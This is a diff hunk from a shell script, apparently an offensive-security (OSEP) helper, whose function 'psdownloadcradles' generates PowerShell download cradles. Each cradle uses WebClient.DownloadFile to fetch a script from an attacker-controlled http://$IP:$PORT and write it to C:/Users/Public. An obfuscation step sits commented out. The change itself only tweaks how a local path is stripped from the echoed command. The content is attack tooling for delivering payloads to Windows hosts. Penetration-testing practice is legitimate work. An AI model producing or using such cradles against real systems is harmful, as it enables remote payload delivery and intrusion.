@@ -275,7 +275,7 @@ function psdownloadcradles(){
                                 FILENAME=$(echo "$SCRIPT_PATH" | rev | cut -d"/" -f1 | rev) 
                                 DOWNLOAD_CRADLE="(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$SCRIPT_PATH','C:/Users/Public/$FILENAME')"
                                 # DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
-                                echo "$DOWNLOAD_CRADLE" | sed "s/\/\/home\/$USER\/OSEP//g"
+                                echo $DOWNLOAD_CRADLE | sed "s*/$DIR_PATH**g"
                                 # echo "$DOWNLOAD_CRADLE_OBFS"
                                 echo "\n"
                         done
